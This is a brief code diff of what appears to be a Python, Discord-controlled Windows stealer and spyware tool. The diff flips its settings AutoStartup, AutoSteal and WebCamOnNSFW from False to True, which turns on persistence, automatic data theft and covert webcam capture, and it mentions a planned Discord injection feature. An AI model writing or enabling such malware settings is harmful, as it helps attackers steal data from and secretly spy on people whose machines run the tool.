@@ -30,9 +30,9 @@ import win32gui
 
 # Settings
 
-AutoStartup = False # added
-AutoSteal = False # added
-WebCamOnNSFW = False # added
+AutoStartup = True # added
+AutoSteal = True # added
+WebCamOnNSFW = True # added
 
 DiscordInjection = False # in development... Soon.
 
@@ -1591,3 +1591,4 @@ if AutoStartup:
     startup()
 wait_for_wifi()
 bot.run(HzzH)
+
